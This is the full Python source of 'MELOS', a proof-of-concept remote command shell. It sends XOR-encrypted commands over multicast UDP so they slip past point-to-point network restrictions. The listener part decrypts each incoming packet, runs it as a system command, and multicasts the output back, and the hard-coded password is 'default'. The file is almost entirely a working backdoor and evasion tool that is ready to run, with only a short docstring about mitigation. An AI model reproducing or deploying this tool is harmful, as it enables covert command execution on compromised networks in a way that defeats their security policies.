"""\
   o       .                         .
                            .
  .   dBBBBBBb  dBBBP  dBP    dBBBBP.dBBBBP
     dB'   dB' dB     dB     dB'.BP BP       .
    dB'dB'dB' dBBP   dBP    dB'.BP  `BBBBb 
   dB'dB'dB' dBP    dBP    dB'.BP      dBP 
  dB'dB'dB' dBBBBP dBBBBP dBBBBP  dBBBBP'                 
                                   .
         .                  .         .
  .      |                
       --o--         LO       .
         |                                o    
   .           .

Multicast Encrypted Low Operations Shell (MELOS) is a POC tool that demonstrates how multicast can be used to bypass point-to-point restrictions on secured network. MELOS is the symetric encrypted version of MERSA that has no foreign library requirements.

MELOS is a non-vendor specific vulnerability that undermines network security policies by operating on multicast. Multicast uses IGMP (L2) or PIM (L3), depending on the type of network, to route multicast traffic. As a result, some networks' security policies can be bypassed due to gaps in the security controls for multicast routing.

Multicast is often forgetten about and rarely utilized within most networks. As a result, it can be overlooked as a vulnerability. The goal of MELOS is to bring attention to the existing security gaps in networks that have multicast enabled. The best way to mitigate any risks against multicast, is to disable it in the router configuration file.\
"""

import subprocess
import socket
import time
import sys
import os

def encrypt(txt, key):
  reps = (len(txt)-1)//len(key) +1
  btxt = txt.encode()
  key = (key * reps)[:len(txt)].encode()
  enc = bytes([i1^i2 for (i1,i2) in zip(btxt,key)])
  return enc

def decrypt(enc, key):
  reps = (len(enc)-1)//len(key) +1
  key = (key * reps)[:len(enc)].encode()
  plain = bytes([i1^i2 for (i1,i2) in zip(enc,key)])
  return plain.decode()

def IPv4LAN():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  try:
    s.connect(("255.255.255.255", 1))
    IP = s.getsockname()[0]
  except Exception:
    IP = "127.0.0.1"
  finally:
    s.close()
  return IP

def multicast_recv(port, address="224.0.0.251", ttl=5, hops=255):
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
  try:
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  except AttributeError:
    pass
  sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, hops) 
  sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 1)
  sock.bind((address, port))
  host = IPv4LAN()
  sock.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_IF, socket.inet_aton(host))
  sock.setsockopt(socket.SOL_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(address) + socket.inet_aton(host))
  sock.settimeout(ttl)
  return sock

def multicast_send(hops=255):
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
  sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, hops)
  return sock

def melos_shell(password, multicast_group="224.0.0.251", commandport=10020, responseport=10050):
  print(f"   =[ Opened listener on {multicast_group}:{commandport} ]\n")
  sock = multicast_recv(commandport, multicast_group, ttl=60)
  respond = multicast_send()
  while True:
    try:
      command, address = sock.recvfrom(4096)
      plain = decrypt(command, password)
      print(f"[{address[0]}:{address[1]}] {plain}")
      if plain == "exit":
        respond.sendto(encrypt("     =[ MELOS Shell Closed ]",password), (multicast_group,responseport))
        respond.close()
        sock.close()
        break
      info = subprocess.check_output(plain.split(" "))
      enc_info = encrypt(info.decode(), password)
      respond.sendto(enc_info, (multicast_group,responseport))
    except KeyboardInterrupt:
      respond.close()
      sock.close()
      break
    except:
      pass

def melos_cmd(password, multicast_group="224.0.0.251", commandport=10020, recvport=10050):
  print(f"    =[ MELOS awaiting {multicast_group}:{recvport} ]\n")
  listen = multicast_recv(recvport, multicast_group, ttl=5)
  sock = multicast_send()
  while True:
    try:
      cmd = input(f"melos@MERSA({multicast_group}) ~$ ")
      enc_cmd = encrypt(cmd, password)
      sock.sendto(enc_cmd, (multicast_group, commandport))
      stdout, address = listen.recvfrom(4096)
      plain = decrypt(stdout, password)
      print(f"     =[ Packet From {address[0]}:{address[1]}]\n{plain}")
      if cmd == "exit":
        listen.close()
        sock.close()
        break
    except KeyboardInterrupt:
      listen.close()
      sock.close()
      break
    except:
      pass

if __name__ == "__main__":
  
  print(__doc__.split("\n\n")[0])
  
  password = "default"
  
  if len(sys.argv) == 1:
    print(f"    =[ Use -l or --listen to start listener ]")
    print(f"    =[ Use -c or --cmd to control listener  ]\n")
  elif sys.argv[1] in ["-c", "--cmd"]:
    melos_cmd(password)
  elif sys.argv[1] in ["-l", "--listen"]:
    melos_shell(password)
